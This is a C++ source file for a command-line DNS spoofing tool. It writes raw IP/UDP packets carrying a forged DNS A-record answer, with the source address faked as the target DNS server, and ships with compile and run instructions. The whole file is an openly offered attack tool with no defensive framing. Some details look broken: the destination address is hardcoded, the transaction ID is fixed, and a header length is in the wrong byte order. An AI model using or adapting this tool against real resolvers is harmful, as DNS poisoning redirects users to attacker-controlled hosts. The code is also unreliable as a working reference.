// Compile: g++ -o dns_spoof dns_spoof.cpp
// Run: sudo ./dns_spoof <target_dns_ip> <domain> <spoofed_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

class DNSSpoofer {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    DNSSpoofer() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void spoof(const char* targetIP, const char* domain, const char* spoofIP) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(53);
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        memset(packet, 0, 4096);
        
        // DNS header
        dns[0] = 0x12; dns[1] = 0x34;  // Transaction ID
        dns[2] = 0x81; dns[3] = 0x80;  // Flags (response)
        dns[4] = 0x00; dns[5] = 0x01;  // Questions
        dns[6] = 0x00; dns[7] = 0x01;  // Answers
        dns[8] = 0x00; dns[9] = 0x00;  // Authority
        dns[10] = 0x00; dns[11] = 0x00; // Additional
        
        // Question section
        int pos = 12;
        char* domainCopy = strdup(domain);
        char* token = strtok(domainCopy, ".");
        while (token) {
            dns[pos++] = strlen(token);
            strcpy(dns + pos, token);
            pos += strlen(token);
            token = strtok(NULL, ".");
        }
        dns[pos++] = 0;
        dns[pos++] = 0x00; dns[pos++] = 0x01;  // Type A
        dns[pos++] = 0x00; dns[pos++] = 0x01;  // Class IN
        free(domainCopy);
        
        // Answer section
        dns[pos++] = 0xC0; dns[pos++] = 0x0C;  // Pointer
        dns[pos++] = 0x00; dns[pos++] = 0x01;  // Type A
        dns[pos++] = 0x00; dns[pos++] = 0x01;  // Class IN
        dns[pos++] = 0x00; dns[pos++] = 0x00;  // TTL
        dns[pos++] = 0x00; dns[pos++] = 0x3C;
        dns[pos++] = 0x00; dns[pos++] = 0x04;  // Data length
        unsigned int spoofIPInt = inet_addr(spoofIP);
        memcpy(dns + pos, &spoofIPInt, 4);
        pos += 4;
        
        // UDP header
        udp->source = htons(53);
        udp->dest = htons(rand() % 65535);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        // IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = target.sin_addr.s_addr;
        ip->daddr = inet_addr("192.168.1.100");
        ip->check = checksum(ip, sizeof(struct iphdr));
        
        sendto(sock, packet, ip->tot_len, 0, 
               (struct sockaddr*)&target, sizeof(target));
    }
    
    ~DNSSpoofer() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_dns> <domain> <spoofed_ip>\n";
        return 1;
    }
    DNSSpoofer spoofer;
    spoofer.spoof(argv[1], argv[2], argv[3]);
    return 0;
}